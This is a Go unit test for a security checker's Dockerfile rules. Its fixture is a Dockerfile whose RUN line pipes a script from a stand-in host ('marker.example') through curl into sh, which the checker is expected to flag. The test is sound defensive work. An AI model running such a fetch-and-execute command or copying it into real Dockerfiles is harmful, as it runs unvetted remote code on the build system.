package secmcp

import (
	"strings"
	"testing"
)

// TestCheckDockerfile: check_change runs the Dockerfile rules on a
// Dockerfile path, with fixed text, and not on other paths.
func TestCheckDockerfile(t *testing.T) {
	content := "FROM debian:buster\nRUN curl -s https://marker.example/i.sh | sh\n"
	out := Check("svc/Dockerfile", content)
	rules := map[string]bool{}
	for _, h := range out.Hits {
		if h.Kind != "container_config" {
			continue
		}
		if strings.Contains(h.Message, "marker") {
			t.Fatalf("repository text in %+v", h)
		}
		rules[h.Rule] = true
	}
	// debian buster ended in 2024, so S-752 holds at any real date.
	if out.Status != "hits" || !rules["S-751"] || !rules["S-752"] || !rules["S-755"] {
		t.Fatalf("got %+v", out)
	}
	for _, h := range Check("svc/notes.txt", content).Hits {
		if h.Kind == "container_config" {
			t.Fatalf("Dockerfile rules on a non-Dockerfile: %+v", h)
		}
	}
}
